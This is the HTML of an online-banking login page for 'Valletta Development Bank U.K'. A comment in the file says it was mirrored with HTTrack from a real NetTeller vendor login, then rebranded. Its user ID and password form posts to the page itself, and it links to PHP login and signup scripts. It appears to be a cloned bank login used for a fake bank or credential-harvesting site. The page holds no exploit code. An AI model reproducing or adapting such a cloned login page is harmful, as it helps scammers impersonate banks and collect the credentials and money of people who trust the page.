<html>

<head><link type="text/css" rel="stylesheet" href="javax.faces.resource/theme.cssab55.css?ln=primefaces-aristo" /><script type="text/javascript" src="javax.faces.resource/jquery/jquery.jse3ba.xhtml?ln=primefaces&amp;v=5.0"></script><script type="text/javascript" src="javax.faces.resource/primefaces.jse3ba.xhtml?ln=primefaces&amp;v=5.0"></script><link type="text/css" rel="stylesheet" href="javax.faces.resource/primefaces.csse3ba.css?ln=primefaces&amp;v=5.0" /><script type="text/javascript" src="javax.faces.resource/jquery/jquery-plugins.jse3ba.xhtml?ln=primefaces&amp;v=5.0"></script><link type="text/css" rel="stylesheet" href="javax.faces.resource/keyboard/keyboard.csse3ba.css?ln=primefaces&amp;v=5.0" /><script type="text/javascript" src="javax.faces.resource/keyboard/keyboard.jse3ba.xhtml?ln=primefaces&amp;v=5.0"></script><link type="text/css" rel="stylesheet" href="javax.faces.resource/watermark/watermark.csse3ba.css?ln=primefaces&amp;v=5.0" /><script type="text/javascript" src="javax.faces.resource/watermark/watermark.jse3ba.xhtml?ln=primefaces&amp;v=5.0"></script>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta http-equiv="refresh" content="1200;url=login.php" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=0" />        
        <link rel="SHORCUT ICON" href="resources/images/favicon.ico" />
        <link type="text/css" rel="stylesheet" href="resources/themes/netteller-theme/netteller-theme.css" />
        <link type="text/css" rel="stylesheet" href="resources/themes/netteller-theme/netteller.css" />
        <style type="text/css">
        body {
	background-color: #7f0955;
}
        </style>
<title>Online Private Bank</title></head><body style="background-color: #7f0955;"><table cellpadding="0" cellspacing="0" style="width:100%">
<tbody>
<tr>
<td>
<div style="position: relative;width: 100%"><table id="templateForm:header1" style="color:white;width:100%;background: #7f0955; height: 42px;">
<tbody>
<tr>
<td><table class="centering">
<tbody>
<tr><td></td></tr></tbody>
</table>
</td>
</tr>
</tbody>
</table>
<table id="templateForm:header2" style="width:100%; background-color: white;">
<tbody>
<tr>
<td><table class="centering">
<tbody>
<tr>
<td><table style="float:left; height: 94px; background-color: white;">
<tbody>
<tr>
<td><img src="img/logo-med.png" alt="Valletta Development Bank U.K, United Kingdom Branch"></td>
</tr>
</tbody>
</table></td>
<td><div id="google_translate_element"></div><script type="text/javascript">
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'fr', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
}
</script><script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>

<div id="wrapper" class="wrapper" style="background-color:#7f0955"><table class="content" style="background:url(img/Valletta-at-Night.jpg) no-repeat scroll center top #7f0955; ;width: 100%;margin:-3px auto 0; height: 719px;">
<tbody>
<tr>
<td class="topPosit"><table class="content" cellpadding="0" cellspacing="0" style="width: 100%;">
<FORM name=Login  action = "" method="POST">
<tbody>
<tr>
<td><table class="centering" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td><table class="login-panel">

<tbody>
<tr>
<td class="info"><span style="font-size: 15px;font-weight: bolder;color: rgb(89, 89, 89);">Welcome to Valletta Development Bank U.K Login Page</span></td>
</tr>
<tr>
<td class="info"><div id="j_idt22" class="ui-messages ui-widget" aria-live="polite"></div></td>
</tr>
<tr>
<td class="info">User ID</td>
</tr>
<tr>
<td class="info"><input id="username" name="username" type="text" value="" autocomplete="off" class="ui-inputfield ui-keyboard-input ui-widget ui-state-default ui-corner-all inputTextLogin" /><script id="userId_s" type="text/javascript">PrimeFaces.cw("Keyboard","widget_userId",{id:"username",widgetVar:"widget_userId",showOn:"button",showAnim:"fadeIn",keypadOnly:false,layoutName:"qwerty",keypadClass:"inputTextLogin"});</script></td>
</tr>
<tr>
<td class="info">Password</td>
</tr>
<tr>
<td class="info"><input id="pin" name="pin" type="password" value="" autocomplete="off" class="ui-inputfield ui-keyboard-input ui-widget ui-state-default ui-corner-all inputTextLogin" /><script id="userPass_s" type="text/javascript">PrimeFaces.cw("Keyboard","widget_userPass",{id:"pin",widgetVar:"widget_userPass",showOn:"button",showAnim:"fadeIn",keypadOnly:false,layoutName:"qwerty",keypadClass:"inputTextLogin"});</script></td>
</tr>
<tr>
<td class="info">Select Language</td>
</tr>
<tr>
<td class="info"><select id="j_idt28:j_idt28" name="j_idt28:j_idt28" class="selectMenuGp" size="1" style="" onChange="PrimeFaces.ab({s:this,e:'valueChange',p:'j_idt28:j_idt28',u:'mainPanelForTemplates'});">	<option value="LANGUAGE-ENGLISH                    " selected="selected">English</option>
</select></td>
</tr>
<tr>
<td class="info"><div style="margin-top: 10px;"><button id="submit" name=submit class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only blueButton"  style="float: left" type="submit"><span class="ui-button-text ui-c">Log in</span></button>


<script id="loginBtn_s" type="text/javascript">PrimeFaces.cw("CommandButton","widget_loginBtn",{id:"submit",widgetVar:"widget_loginBtn"});</script><div style="float: right;text-align: right"><a href="signup.php"> Not Registered? Signup</a>
                                                    <br />
                                                    <br /></div></div></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</form>
</table>
</td>
</tr>
</tbody>
</table>
<table class="content login-links" cellpadding="0" cellspacing="0">
<tbody>
<tr>
  <td class="topPosit"></tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>
					
                    <script type="text/javascript" src="resources/js/netinfo.js"></script>
                    <script type="text/javascript" src="resources/js/clientDetection.js"></script></td>
</tr>
</tbody>
</table>


        <script>history.forward(1);</script>
        <script type="text/javascript" src="resources/js/netinfo.js"></script></body>

<!-- Mirrored from ibanking.fnfdata.com/netteller-war/Login.xhtml by HTTrack Website Copier/3.x [XR&CO'2010], Tue, 26 Apr 2016 17:02:58 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
</html>